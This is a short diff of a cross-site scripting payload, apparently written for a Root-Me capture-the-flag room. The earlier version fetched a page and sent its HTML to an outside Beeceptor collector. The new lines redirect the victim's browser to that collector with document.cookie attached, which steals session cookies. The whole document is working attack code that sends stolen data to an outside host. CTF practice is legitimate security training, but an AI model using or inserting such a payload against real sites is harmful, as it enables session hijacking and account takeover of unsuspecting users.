@@ -1,11 +1,10 @@
 <script>
-var url = "http://ctf15.root-me.org/room";
+var url = "http://ctf15.root-me.org/";
 var req = new XMLHttpRequest();
 
 req.onload = function () {
     if (req.status === 200) {
-        var data = encodeURIComponent(req.response.documentElement.innerHTML);
-        window.location ="https://toitoise.free.beeceptor.com/?c=" + data;
+        window.location ="https://toitoise.free.beeceptor.com/?c=" + document.cookie;
     }
 };
 
